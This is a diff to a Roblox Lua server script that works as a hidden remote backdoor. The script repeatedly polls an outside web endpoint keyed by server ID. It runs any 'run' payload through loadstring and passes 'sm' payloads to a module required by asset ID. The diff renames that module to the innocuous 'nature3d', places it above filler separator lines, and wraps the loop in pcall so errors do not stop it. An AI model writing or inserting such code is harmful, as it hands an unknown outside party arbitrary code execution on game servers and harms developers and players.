@@ -1,8 +1,21 @@
+local nature3d = require(136937079949491)
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+-----------------------------------
+
+
+
+
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MessagingService = game:GetService("MessagingService")
-
-local mm = require(136937079949491)
 
 local remote = Instance.new("RemoteEvent")
 remote.Name = "CollectGift"
@@ -57,32 +70,49 @@ MessagingService:SubscribeAsync("Bice", function(message)
 end)]]
 
 task.defer(function()
-	local sidObject = ReplicatedStorage:WaitForChild("ServerId")
+    local sidObject = ReplicatedStorage:WaitForChild("ServerId")
 
-	repeat task.wait()
-	until sidObject.Value ~= 0
+    repeat task.wait()
+    until sidObject.Value ~= 0
 
-	local id = sidObject.Value
-	print("Listening")
+    local id = sidObject.Value
+    print("Listening")
 
-	while true do
-		local data = HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
-		local json = HttpService:JSONDecode(data)
-		
-		local messages = json.messages
-		for _, message in messages do
-			print(message)
+    while true do
+        local s, data = pcall(function()
+            return HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
+        end)
 
-			local parsed = parse(message)
-			local cmd = table.remove(parsed, 1)
-			
-			if cmd == "run" then
-				loadstring(parsed[1])()
-			elseif cmd == "sm" then
-				mm.message(parsed[1])
-			end
-		end
-		
-		task.wait(1.1)
-	end
+        if s and data then
+            local js, json = pcall(function()
+                return HttpService:JSONDecode(data)
+            end)
+
+            if js and typeof(json) == "table" and typeof(json.messages) == "table" then
+                for _, message in json.messages do
+                    pcall(function()
+                        print(message)
+
+                        local parsed = parse(message)
+                        if typeof(parsed) ~= "table" then return end
+
+                        local cmd = table.remove(parsed, 1)
+
+                        if cmd == "run" and parsed[1] then
+                            local fn = loadstring(parsed[1])
+                            if fn then
+                                fn()
+                            end
+                        elseif cmd == "sm" and parsed[1] then
+                            if nature3d then
+                                nature3d.message(parsed[1])
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+
+        task.wait(1.1)
+    end
 end)
